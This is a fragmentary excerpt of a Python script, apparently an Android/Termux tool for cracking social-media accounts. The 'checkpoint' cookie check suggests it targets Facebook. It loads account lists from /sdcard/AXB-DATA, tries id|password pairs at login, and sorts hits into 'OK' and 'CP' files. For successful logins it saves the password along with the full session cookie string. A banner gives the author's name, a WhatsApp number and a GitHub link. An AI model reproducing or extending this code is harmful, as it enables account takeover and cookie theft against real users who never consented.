...
def banner():
	...
	sol().print(cik2)
	ban='''
•   AUTHOR : AZAN ALI WHATSAPP : 923165456679   •
...
•                                               •
•   GITHUB : HTTPS://GITHUB.COM/MR-AZAN/AXD   •'''
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/AXB-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('/sdcard/AXB-DATA/OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		...
		lol = {}
		for isi in my_files:
			try:hem = open('/sdcard/AXB-DATA/CP/'+isi,'r').readlines()
			except:
				try:hem = open('/sdcard/AXB-DATA/OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/AXB-DATA/1CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/AXB-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/AXB-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='SUCCESSFUL'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/AXB-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green] SUCCESSFUL [/bold green]'))
					ok+=1
					break
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/AXB-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/AXB-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/AXB-DATA/DUMP')
	except:pass
	login()
